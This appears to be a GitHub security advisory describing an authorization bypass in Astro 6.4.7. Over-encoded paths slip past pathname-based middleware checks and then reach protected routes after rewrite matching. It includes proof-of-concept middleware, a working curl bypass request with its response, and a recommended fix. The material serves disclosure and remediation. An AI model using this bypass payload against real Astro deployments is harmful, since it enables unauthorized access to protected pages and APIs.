# [H] Astro: Authorization Bypass via Decode Iteration Limit and Rewrite Path Canonicalization Mismatch

## Summary
Severity: High
Advisory: GHSA-vj59-8hwv-xxmv
CVE: CVE-2026-59731
CWE: CWE-647
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-vj59-8hwv-xxmv
Type: github-advisory

## Affected
- npm: `astro` — affected >=6.4.7 <6.4.8

## Details
# Astro 6.4.7 Authorization Bypass via Decode Iteration Limit and Rewrite Path Canonicalization Mismatch

## Summary

Astro 6.4.7 appears to reintroduce a middleware authorization bypass pattern when a request path is encoded more deeply than the newly introduced iterative URL decoder's maximum decoding depth.

The issue occurs because Astro performs authorization decisions on a partially decoded pathname after reaching a decoding iteration cap, while later route matching logic performs an additional `decodeURI()` operation and resolves the request to a protected route.

As a result, middleware and route matching may operate on different pathname representations, enabling authorization bypasses under specific application patterns.

**Potential CWE:** CWE-647 – Use of Non-Canonical URL Paths for Authorization Decisions

---

## Vulnerable Pattern

Middleware authorization sees:

```text
/%61dmin
```

Later rewrite route matching sees:

```text
/admin
```

This discrepancy allows a request that bypasses middleware checks to subsequently resolve to a protected route.

---

## Root Cause

### Iterative Decoding Logic

PR #16967 introduced iterative URI decoding:

```js
let iterations = 0;

while (decoded !== pathname && iterations < 10) {
	pathname = decoded;

	try {
		decoded = decodeURI(pathname);
	} catch {
		// decodeURI can fail when a decoded literal '%' forms an
		// invalid sequence with adjacent characters.
		break;
	}

	iterations++;
}

return decoded;
```

The intent was to ensure middleware receives a fully decoded canonical pathname.

However, once the iteration cap is reached, Astro returns the partially decoded value instead of rejecting the request.

---

### Rewrite Route Matching

Later, Astro performs another decode during route matching:

```js
const decodedPathname = decodeURI(pathname);
```

Consequently:

```text
Middleware pathname: /%61dmin
Route matcher:       /admin
```

This creates a canonicalization mismatch between authorization logic and routing logic.

---

## Proof of Concept

### Middleware

```js
import { defineMiddleware } from 'astro:middleware';

export const onRequest = defineMiddleware(async (context, next) => {
	const pathname = context.url.pathname;

	if (pathname === '/admin' || pathname.startsWith('/admin/')) {
		return new Response(
			'403 Forbidden: middleware blocked canonical /admin',
			{
				status: 403,
				headers: {
					'content-type': 'text/plain;charset=UTF-8',
					'x-middleware-pathname': pathname,
				},
			}
		);
	}

	if (pathname !== '/') {
		const response = await next(context.url);

		response.headers.set('x-middleware-pathname', pathname);
		response.headers.set(
			'x-vuln-pattern',
			'next(context.url) rewrite after pathname check'
		);

		return response;
	}

	return next();
});
```

The critical pattern is:

```js
return next(context.url);
```

The middleware makes an authorization decision using a non-canonical path and then forwards the URL into Astro's rewrite machinery.

---

## Reproduction

### Protected Route

```bash
curl -i http://127.0.0.1:8989/admin
```

Response:

```http
HTTP/1.1 403 Forbidden
x-middleware-pathname: /admin

403 Forbidden: middleware blocked canonical /admin
```

---

### Bypass Request

```bash
curl -i http://127.0.0.1:8989/%252525252525252525252561dmin
```

Response:

```http
HTTP/1.1 200 OK
x-middleware-pathname: /%61dmin
x-vuln-pattern: next(context.url) rewrite after pathname check

Admin page reached
Protected content rendered after rewrite route matching.
request url: http://127.0.0.1:8989/%61dmin
```

This demonstrates:

```text
Middleware saw: /%61dmin
Router reached: /admin
```

---

## Encoding Depth Analysis

The bypass occurs at encoding depth 11.

### Decoder Trace

```text
depth 0:  /%61dmin                              -> /admin
depth 1:  /%2561dmin                            -> /admin
depth 2:  /%252561dmin                          -> /admin
depth 3:  /%25252561dmin                        -> /admin
depth 4:  /%2525252561dmin                      -> /admin
depth 5:  /%252525252561dmin                    -> /admin
depth 6:  /%25252525252561dmin                  -> /admin
depth 7:  /%2525252525252561dmin                -> /admin
depth 8:  /%252525252525252561dmin              -> /admin
depth 9:  /%25252525252525252561dmin            -> /admin
depth 10: /%2525252525252525252561dmin          -> /admin
depth 11: /%252525252525252525252561dmin        -> /%61dmin
```

Depths 0–10 are fully decoded and blocked by middleware.

Depth 11 is the first depth where Astro returns a partially decoded pathname due to the iteration limit.

A later `decodeURI()` converts:

```text
/%61dmin
```

into:

```text
/admin
```

allowing route matching to reach the protected endpoint.

---

## Exploit Preconditions

Exploitation requires:

### 1. Path-Based Authorization

Middleware performs authorization using:

```js
context.url.pathname
```

For example:

```js
if (context.url.pathname === '/admin') {
	block();
}
```

### 2. Rewrite-Based Routing

The request is subsequently passed into Astro routing via:

```js
next(context.url)
```

or equivalent rewrite behavior that performs route matching after middleware execution.

---

## Impact

An unauthenticated attacker may bypass middleware protections guarding routes such as:

```text
/admin
/api/admin
/internal
/dashboard
```

if the application:

1. Relies on pathname-based authorization checks.
2. Uses rewrite behavior that performs route matching after middleware execution.

Affected applications may expose protected pages or APIs despite middleware restrictions.

---

## Security Analysis

The issue belongs to the same vulnerability class as the previously disclosed Astro middleware encoding bypass.

Previous advisories demonstrated bypasses using:

```text
/%2561dmin
```

to reach:

```text
/admin
```

The 6.4.7 fix attempted to ensure middleware receives a canonical pathname by repeatedly decoding URL-encoded paths.

However, because decoding is capped at 10 iterations and partially decoded paths are returned, an attacker can simply increase encoding depth beyond the cap and recreate the authorization-routing mismatch.

The existence of a decoding limit is not itself problematic.

The vulnerability arises because Astro:

1. Stops decoding.
2. Returns a partially canonicalized pathname.
3. Performs additional decoding later during route matching.

Authorization and routing therefore operate on different pathname representations.

---

## Recommended Fix

Do not return partially decoded pathnames when the iteration limit is exceeded.

Instead, reject the request whenever decoding has not stabilized before reaching the cap.

### Example Fix

```js
let iterations = 0;

while (decoded !== pathname) {
	if (iterations >= 10) {
		throw new Error('URL encoding depth exceeded');
	}

	pathname = decoded;

	try {
		decoded = decodeURI(pathname);
	} catch {
		break;
	}

	iterations++;
}

return decoded;
```

### Additional Hardening

Astro should centralize pathname canonicalization and ensure routing logic never performs an additional independent `decodeURI()` on values that have already been normalized.

Authorization and route matching must operate on the exact same canonical pathname representation.

---

## Conclusion

Astro 6.4.7 appears vulnerable to an authorization bypass caused by a pathname canonicalization mismatch introduced by the iterative decoding limit.

When URL encoding depth exceeds the decoder's maximum iteration count, middleware receives a partially decoded pathname while later route matching performs additional decoding and resolves the request to a protected route.

This can allow unauthorized access to routes protected by pathname-based middleware authorization and should be addressed by rejecting over-encoded paths or ensuring a single canonical pathname representation is used throughout request processing.

## References
- https://github.com/withastro/astro/security/advisories/GHSA-vj59-8hwv-xxmv
- https://nvd.nist.gov/vuln/detail/CVE-2026-59731
- https://github.com/withastro/astro/pull/17109
- https://github.com/withastro/astro/commit/27c80ea92248993e5fce94b2c26d87d611ab6785
- https://github.com/withastro/astro
- https://github.com/withastro/astro/releases/tag/astro@6.4.8
